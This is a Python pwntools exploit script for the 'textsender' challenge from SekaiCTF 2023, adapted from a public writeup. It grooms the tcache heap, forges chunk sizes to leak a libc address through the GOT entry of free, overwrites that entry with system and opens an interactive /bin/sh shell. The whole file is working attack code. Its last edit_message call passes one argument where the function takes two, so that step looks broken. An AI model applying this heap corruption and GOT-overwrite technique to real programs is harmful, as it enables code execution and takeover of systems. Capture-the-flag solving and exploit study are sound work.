#!/usr/bin/env python3

# type: ignore
# flake8: noqa

"""
Based on: https://github.com/5kuuk/CTF-writeups/blob/main/sekai-2023/textsender/expsender.py
"""

from pwn import *

elf = context.binary = ELF("./textsender", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def set_sender(s):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"name: ", s)


def add_message(r, msg):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Receiver: ", r)
    io.sendlineafter(b"Message: ", msg)


def send_all():
    io.sendlineafter(b"> ", b"5")


def print_all():
    io.sendlineafter(b"> ", b"4")


def edit_message(r, msg):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Name: ", r)
    resp = io.recvline()
    if b"Cannot find name!" in resp:
        return False
    log.info("hit!")
    io.sendlineafter(b"New message: ", msg)
    return True


env = {}
io = start()

for i in range(7):
    add_message(b"tcache_name" * 4, b"tcache_content" * 4)

add_message(b"faka" * 20, b"FAKA" * 20)
set_sender(b"sender" * 8)
send_all()

for i in range(6):
    add_message(b"tcache_name" * 4, b"tcache_content" * 4)

edit_message(b"A" * 1024, b"m")
add_message(b"empty", b"bins")
edit_message(b"a" * (0x2a0 - 8) + p64(0x20 | 1) + b"Sender: \x00" * 512, b"m")
send_all()

for i in range(6):
    add_message(b"tcache_name" * 4, b"tcache_content" * 4)

add_message(b"victim", b"victim")
edit_message(b"a" * (0x2a0 - 8) + p64(0x20 | 1) + p64(elf.got["free"]) * 2,
             b"m")
print_all()
io.recvuntil(b"6) ")
libc_leak = u64(io.recvline(keepends=False).split(b": ")[0].ljust(8, b"\x00"))
libc.address = libc_leak - libc.symbols["free"]
log.info(f"{libc.address=:#x}")

edit_message(p64(libc_leak), p64(libc.symbols["system"]))
edit_message(b"/bin/sh\x00")


io.interactive()
